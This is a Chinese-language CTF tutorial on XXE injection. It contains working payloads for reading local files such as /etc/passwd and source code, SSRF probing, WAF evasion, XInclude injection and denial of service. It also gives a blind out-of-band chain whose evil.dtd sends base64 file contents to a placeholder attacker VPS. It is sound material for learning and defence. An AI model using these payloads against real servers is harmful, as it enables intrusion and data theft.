---
title: XXE
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---

# XXE XML外部实体注入

> XXE（XML External Entity Injection）发生在服务端解析 XML 时加载了你定义的外部实体。不止是 `.xml` 文件——许多数据格式底层是 XML：SVG 图片、SOAP 消息、RSS 订阅流、Word/Excel 文档（OOXML）、配置文件和 Sitemap。

---

## 一、场景 — XXE 在哪里出现

### 1.1 典型场景

XXE（XML External Entity Injection，XML 外部实体注入）是一种针对 XML 解析器的漏洞。当服务器解析用户提交的 XML 数据时，如果允许引用外部实体且没有做过滤，攻击者可以读取服务器本地文件、探测内网端口、发起 SSRF 请求。

```
场景A：API接口接受XML格式请求 → Content-Type: application/xml
场景B：SVG头像上传 → 服务端解析SVG时读取外部实体
场景C：SOAP WebService → 请求体是XML，修改DTD
场景D：Docx/Xlsx文件上传 → 解压后XML被解析
场景E：RSS/Atom feed导入 → 外部实体读取本地文件
场景F：SAML/SSO断言 → XML签名验证前解析实体
```

### 1.2 判断入口

| 入口特征 | 检查方法 |
|:--------:|---------|
| Content-Type: application/xml | 直接改请求体为测试XML |
| Content-Type: text/xml | 同上 |
| Content-Type: multipart/form-data 含XML字段 | 修改对应字段 |
| SVG上传 | 服务端是否用XML处理器解析 |
| SOAP/XMLRPC | WSDL中是否有外部实体引用 |
| 请求体以 `<?xml` 开头 | 最明显，直接测试 |

**关键思路：** 即使原始请求是 JSON，也要尝试改 Content-Type 为 `application/xml` 提交 XML payload，看服务端是否同时支持两种格式。

### 1.3 XXE 五大攻击目标

| 攻击目标 | 说明 | 典型 Payload |
|:-------:|------|:------------:|
| 文件读取 | 读取服务器任意文件 | `file:///etc/passwd` |
| SSRF 内网探测 | 扫描内网端口和服务 | `http://127.0.0.1:6379/` |
| 拒绝服务 | 资源耗尽 | Billion Laughs、`/dev/random` |
| Blind OOB 外带 | 无回显时通过带外通道传数据 | `%dtd;` + evil.dtd |
| 命令执行 | 需要 expect 扩展 | `expect://id`（极少） |

---

## 二、原理 — XML 与 DTD 让你能"引用外部资源"

### 2.1 XML 实体基础

XML 是一种标记语言，用自定义标签描述数据。一个最简单的 XML 文档：

```xml
<?xml version="1.0" encoding="UTF-8"?>   <!-- XML 声明 -->
<user>                                     <!-- 根元素 -->
    <name>zhangsan</name>
</user>
```

XML 可以在文档头部用 DTD（Document Type Definition）定义"实体"——类似于变量，定义一次，在文档里用 `&实体名;` 引用：

```xml
<!-- 内部实体：值写在DTD里 -->
<!DOCTYPE foo [
  <!ENTITY name "zhangsan">
]>
<foo>&name;</foo>   <!-- 解析后：<foo>zhangsan</foo> -->

<!-- 外部实体：SYSTEM指向外部资源 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>    <!-- 解析后：passwd文件内容 -->
```

**核心：** `SYSTEM` 关键字后接 URI，解析器去读取该资源。只有解析器启用了 DTD/实体加载与实体替换时才生效。

### 2.2 两种实体的区别

XML 中有两种实体——通用实体和参数实体：

| 类型 | 标记 | 使用位置 | 用途 |
|:----:|:----:|:--------:|:----:|
| 通用实体 | `&实体名;` | XML文档正文 | 在正文中展开 |
| 参数实体 | `%实体名;` | DTD内部 | 在DTD中定义和使用 |

参数实体只能出现在 DTD 内部，这是 Blind XXE 攻击中 evil.dtd 全部用 `%` 的原因。

### 2.3 漏洞代码

```php
<?php
$xml = $_POST['xml'];  // 接收用户输入的XML
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // 危险！
echo $dom->textContent;
?>
```

关键标志位：
- `LIBXML_NOENT`：替换实体引用为实际内容（展开实体）
- `LIBXML_DTDLOAD`：允许加载外部 DTD
- `libxml_disable_entity_loader()`：PHP 8.0 起已废弃

> libxml2 2.9+ 默认不做外部实体替换，但代码显式传 `LIBXML_NOENT` 会重新启用。

### 2.4 攻击分类

```
XXE
├── 有回显 XXE — 文件内容直接在响应中
├── Blind XXE (OOB) — 无回显，通过带外通道传数据
├── XXE + SSRF — 利用SSRF探测内网
├── XXE + DoS — 资源耗尽（billion laughs）
└── XInclude — 不用DOCTYPE的变种（控制XML局部）
```

---

## 三、实战 — 从基础到高级利用

### 3.1 有回显 XXE — 基础 Payload

**读取文件：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**读取 PHP 源码（base64编码避免破坏XML结构）：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<foo>&xxe;</foo>
```

**SSRF 内网探测：**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

### 3.2 Blind XXE — 无回显带外数据（完整 OOB 流程）

#### 【场景】服务端解析 XML 但只返回 "OK"，不回显实体内容

```
请求：XML 含文件读取实体
响应：OK（无文件内容）
需要：带外通道将数据传出来
```

#### 【原理】通过外部 DTD 嵌套参数实体，让服务器向攻击者 VPS 发起带数据的 HTTP 请求

**发给目标服务器的 XML：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://你的VPS:8080/evil.dtd">
  %dtd;
]>
<foo></foo>
```

**VPS 上的 evil.dtd：**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///flag">
<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://你的VPS:8080/?c=%file;'>">
%req;
%send;
```

#### 【OOB 执行流程四步走】

| 步骤 | 动作 | 结果 |
|:----:|:----:|:----:|
| 1 | 服务器请求 evil.dtd | 拉取到 DTD 内容 |
| 2 | 解析 `%file` | 读取 /flag 并 base64 编码 |
| 3 | 解析 `%req`，执行 `%req;` | 定义 `%send` 实体，URL 中拼入 %file |
| 4 | 执行 `%send;` | 服务器向你的 VPS 发起带 flag 的请求 |

#### 【为什么 evil.dtd 全部用 `%`？】

XML 中有两种实体：
- `&实体名;`（通用实体）—— 用在文档正文里
- `%实体名;`（参数实体）—— 只能用在 DTD 内部

`evil.dtd` 整个文件就是一段纯 DTD，没有文档正文，所以定义和引用全部用 `%`。`&#x25;` 是 `%` 的字符引用写法——因为在实体定义的字符串值内部不能直接写 `%`（会被当作引用去解析），用 `&#x25;` 替代，延迟了 `%` 的生效时机。

#### 【为什么 evil.dtd 需要四行？】

| 行 | 代码 | 作用 |
|:-:|:----|:----|
| 1 | `<!ENTITY % file SYSTEM "php://...">` | 定义 `%file` = 读取 /flag 并 base64 编码 |
| 2 | `<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://.../?c=%file;'>">` | 定义 `%req` = "定义 `%send` 的 DTD 语句" |
| 3 | `%req;` | 执行 `%req`，展开后把 `%send` 的定义注入到 DTD 中 |
| 4 | `%send;` | 执行 `%send`，触发带外 HTTP 请求 |

### 3.3 Blind XXE 完整操作步骤（从零到拿到 flag）

#### 【场景假设】CTF 题目接受 XML，只返回 "OK"，flag 在 `/flag`

#### Step 1: VPS 放行端口并创建 evil.dtd

```bash
mkdir -p /var/www/html && cd /var/www/html
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///flag">
<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://你的VPS:8080/?c=%file;'>">
%req;
%send;
EOF
```

#### Step 2: 启动 HTTP 服务

```bash
# 方式一：Python HTTP 服务器
python3 -m http.server 8080

# 方式二：nc 监听（手动响应）
while true; do echo -e 'HTTP/1.1 200 OK\r\n\r\n' | nc -lvp 8080; done
```

#### Step 3: 提交 XML Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://你的VPS:8080/evil.dtd">
  %dtd;
]>
<r></r>
```

VPS 终端先看到 `GET /evil.dtd`，接着看到：
```
GET /?c=ZmxhZ3t4eG... HTTP/1.1
```

#### Step 4: 解码 flag

```bash
echo "ZmxhZ3t4eG..." | base64 -d
# flag{xxxx-xxxx-xxxx}
```

#### 【没有 VPS 怎么办？】

| 替代方案 | 说明 | 限制 |
|:--------:|------|:----:|
| Webhook.site | 在线接收 HTTP 请求 | 请求内容公开 |
| RequestBin | 在线接收 HTTP 请求 | 有时效性 |
| BurpSuite Collaborator | Burp Pro 功能 | 需要 Pro 版 |
| DNSLog.cn | DNS 外带 | 不能传文件内容 |

### 3.4 XInclude — 绕过 DOCTYPE 限制

#### 【场景】只能控制 XML**局部内容**（不能改顶部 DOCTYPE）

后端把用户输入拼接进一个固定的 XML 模板中间：

```xml
<data><name>用户的输入</name></data>
```

如果你输入了 `</name><xi:include .../><name>`，最终 XML 变成：

```xml
<data><name></name><xi:include .../><name></name></data>
```

#### XInclude Payload

```xml
<!-- 插入在任意XML元素内部 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

#### 普通 XXE vs XInclude

| 对比项 | 普通XXE | XInclude |
|:------:|:-------:|:--------:|
| 需要DOCTYPE | 是 | 否 |
| 需要ENTITY | 是 | 否 |
| 读非XML文件 | 是 | 需加 `parse="text"` |
| 生效条件 | 外部实体未禁用 | XInclude 处理器启用 |
| 控制范围 | 可控制完整的 XML 头部 | 只能控制 XML 局部 |
| CTF 开启条件 | DTD 加载启用 | `LIBXML_XINCLUDE` 或 `$dom->xinclude()` |

#### 【实战：XInclude 闭合注入】

后端模板：
```xml
<data><name>INPUT</name></data>
```

你的输入：
```xml
</name><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///flag" parse="text"/><name>
```

最终解析后的 XML：
```xml
<data>
  <name></name>
  <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///flag" parse="text"/>
  <name></name>
</data>
```

### 3.5 变形绕过技巧

#### 技巧1: UTF-16 编码绕过关键词检测

后端对 `file:` `flag` 做字符串匹配，切换编码后字节完全改变：

```xml
<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<foo>&xxe;</foo>
```

**注意：** 整个请求体必须真的按 UTF-16BE 编码，Content-Type、BOM 和编码声明必须一致。

#### 技巧2: SVG 上传 XXE

SVG 本质是 XML，服务端用 XML 解析器处理时才可能触发：

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <desc>&xxe;</desc>
  <rect width="100" height="100" fill="black"/>
</svg>
```

#### 技巧3: 外部 DTD 绕过 WAF

把攻击逻辑全移到 VPS 上的 `.dtd` 文件，请求体只留干净引用：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://你的VPS/wrapper.dtd">
<foo>&send;</foo>
```

WAF 视角：没有 `<!ENTITY`、没有 `file://`、没有可疑关键词。

#### 技巧4: 格式混淆

在 XML 语法允许的位置加换行/空格/单引号：

```xml
<!DOCTYPE foo
[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### 3.6 协议速查表

| 协议 | 用途 | 示例 | 依赖 |
|:----:|:----:|:----:|:----:|
| `file://` | 读取本地文件 | `file:///etc/passwd` | libxml2 默认支持 |
| `http://` | SSRF/带外探测 | `http://127.0.0.1:8080/` | 网络出站 |
| `php://filter` | 读取 PHP 源码（base64） | `php://filter/convert.base64-encode/resource=config.php` | PHP stream wrapper |
| `expect://` | 命令执行（需 expect 扩展） | `expect://id` | 极少开启 |
| `ftp://` | FTP 带外探测 | `ftp://VPS/data` | 网络出站 |
| `data://` | 内联数据 | `data://text/plain,test` | PHP 配置允许 |
| `gopher://` | 任意 TCP | XXE 中通常不支持 | PHP 默认不支持 |

> `gopher://` 不是 PHP 默认注册的 Stream Wrapper，不能当作 XXE 的通用协议。

### 3.7 拒绝服务（DoS）

```xml
<!-- 读取随机设备可能阻塞解析器 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>
```

CTF 虽少见，但也是 XXE 的一种利用方向。

---

## 四、避坑 — 新手常见错误

### 4.1 误以为 SVG 上传就一定 XXE

SVG 文件只有被**服务端 XML 解析器处理**时才可能触发 XXE。如果只是按静态资源返回给浏览器，浏览器不会因此读取服务器本地文件。

### 4.2 混淆实体编码绕过的生效范围

```xml
<!-- 无效！SYSTEM值中的字符引用不会展开 -->
<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">
```

XML 规范规定：`SYSTEM` 引号字符串中的字符引用不会重新解析。不能当成通用绕过。

### 4.3 CDATA 不能包裹实体引用

```xml
<!-- 无效！CDATA内的 &xxe; 不会展开 -->
<foo><![CDATA[&xxe;]]></foo>
```

正确做法：用 `php://filter` base64 编码，避开 XML 特殊字符。

### 4.4 双实体拼接通常不生效

```xml
<!-- 标准解析器不支持SYSTEM值中展开普通实体 -->
<!ENTITY part1 "file://">
<!ENTITY part2 "/etc/passwd">
<!ENTITY xxe SYSTEM "&part1;&part2;">
```

### 4.5 Blind XXE 常见故障排查表

| 现象 | 可能原因 | 修复方法 |
|:----:|:--------:|:--------:|
| Connection timed out | 服务器连不上你的 VPS | 放行安全组端口；确认公网可达；换个端口 |
| Invalid URI | flag 含 `}` `#` `&` 等特殊字符 | 先用 `php://filter` base64 编码 |
| 收到 DTD 请求无二次请求 | `%file;` 或 `%send;` 执行失败 | 检查 evil.dtd 语法和实体名匹配 |
| 外部 DTD 不加载 | 服务器禁止出网 | 换其他带外方式或找内部可达服务 |
| 返回 "FAIL" | DTD 拉取超时 | 确认 VPS 的 HTTP 服务在运行 |
| 实体内容为空 | 文件路径错了或没有权限 | `file:///flag` vs `file:///flag.txt` |
| 只收到一半 base64 | URI 太长被截断 | 缩短路径或分多次外带 |
| 响应乱码 | XML 编码与请求体编码不一致 | 统一 UTF-8 |

### 4.6 注意 libxml2 版本

| libxml2 版本 | 默认行为 | 如何绕过 |
|:-----------:|:--------:|:--------:|
| < 2.9 | 默认加载外部实体 | 不需要特殊参数 |
| ≥ 2.9 | 默认不替换实体 | 需要 `LIBXML_NOENT` 标志 |
| PHP 8 | libxml2 更新 | `libxml_disable_entity_loader()` 已废弃 |

libxml2 2.9+ 默认禁用外部实体替换。但代码显式传 `LIBXML_NOENT | LIBXML_DTDLOAD` 会重新启用。不要默认"高版本一定安全"。

### 4.7 完整新手避坑清单

| 编号 | 坑 | 正确做法 |
|:----:|:---:|:--------:|
| 1 | 只测 `file://` 不测 SSRF | 同时测试 SSRF 和文件读取 |
| 2 | Blind XXE 不用 base64 | 特殊字符破坏 XML 结构 |
| 3 | 以为 SVG 上传就是 XXE | 确认服务端是否用 XML 解析器处理 |
| 4 | SYSTEM 值里用实体编码绕过 | 标准解析器不支持 |
| 5 | CTF 中 Blind XXE 不用 VPS | 没有 VPS 就用 Webhook.site |
| 6 | 只试一个端口 | 多试几个端口（80、443、8080、8888） |
| 7 | 忘记改 Content-Type | JSON 接口可能也接受 XML |
| 8 | 大文件直接外带 | 先 base64 再分段 |
| 9 | XInclude 和普通 XXE 混用 | 它们是两套独立机制 |
| 10 | 以为 CDATA 能包裹实体 | CDATA 中的 &xxe; 不会展开 |

---

## 五、知识总结表

### XXE 攻击方式对比

| 攻击类型 | 有无回显 | 是否需外带 | 核心payload | 适用场景 |
|:-------:|:-------:|:---------:|:-----------:|:--------:|
| 基础文件读取 | 有 | 否 | `<!ENTITY xxe SYSTEM "file:///flag">` | 响应包含解析结果 |
| PHP源码读取 | 有 | 否 | `php://filter/convert.base64-encode/resource=file.php` | 避免 XML 特殊字符破坏 |
| Blind XXE(OOB) | 无 | 是 | `%dtd;` → evil.dtd 带外 | 响应不回显实体内容 |
| SSRF | 可有可无 | 视情况 | `SYSTEM "http://内网地址/"` | 需要探测内网 |
| XInclude | 取决于回显 | 视情况 | `<xi:include parse="text"/>` | 只能控制 XML 局部 |
| DoS | 无 | 否 | `file:///dev/random` | 耗尽资源 |

### 协议支持速查

| 协议 | 文件读取 | SSRF | 命令执行 | 带外 | PHP专用 |
|:----:|:-------:|:----:|:--------:|:----:|:-------:|
| `file://` | 是 | 否 | 否 | 否 | 否 |
| `http://` | 否 | 是 | 否 | 是 | 否 |
| `php://filter` | 是(编码) | 否 | 否 | 否 | 是 |
| `expect://` | 否 | 否 | 是 | 否 | 是(极少) |
| `ftp://` | 否 | 是 | 否 | 是 | 否 |

### Blind XXE 关键点速查

| 元素 | 说明 |
|:----:|:----:|
| `<!ENTITY % dtd SYSTEM "http://VPS/evil.dtd">` | 定义参数实体指向外部 DTD |
| `%dtd;` | 执行参数实体，拉取外部 DTD |
| evil.dtd 中 `%file` | 读取目标文件并 base64 编码 |
| evil.dtd 中 `&#x25;` | 字符引用，表示 `%`，延迟实体定义时机 |
| evil.dtd 中 `%send` | 执行带外请求，URL 中携带编码后的内容 |

### XInclude vs 普通 XXE 对比

| 对比项 | 普通 XXE（实体） | XInclude |
|:------:|:---------------:|:--------:|
| 需要 `<!DOCTYPE` | 是 | 否 |
| 需要 `<!ENTITY` | 是 | 否 |
| 能读非 XML 文件 | 是 | 需加 `parse="text"` |
| 生效条件 | 外部实体未禁用 | XInclude 处理器启用 |
| 控制范围 | 整个 XML 头部 | XML 局部节点 |
| CTF 标志 | `LIBXML_DTDLOAD` | `LIBXML_XINCLUDE` |

### 不同语言/平台的 XXE 检测

| 语言/平台 | 关键函数/库 | 危险配置 |
|:--------:|:----------:|:--------:|
| PHP | `DOMDocument::loadXML()` | `LIBXML_NOENT` |
| PHP | `SimpleXMLElement()` | 默认不展开实体 |
| Python | `lxml.etree.parse()` | `no_network=False` |
| Python | `xml.etree.ElementTree` | 默认安全 |
| Java | `DocumentBuilderFactory` | `setExpandEntityReferences(true)` |
| Java | `SAXParser` | 未禁用 DTD |
| C# | `XmlDocument` | `XmlResolver` 未设为 null |
| Node.js | `libxmljs` | 默认安全 |
| Ruby | `REXML` | 默认安全 |

### 快速验证命令

```bash
# PHP 中测试 XXE 是否可能
php -r "var_dump(libxml_disable_entity_loader(false));"

# Python 测试 XML 解析
python3 -c "
from lxml import etree
xml = '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'
try:
    tree = etree.fromstring(xml)
    print(tree.text)
except Exception as e:
    print(f'Error: {e}')
"

# 将文件转 base64 用于 php://filter
cat /flag | base64 -w0
echo -n "flag content" | base64
```
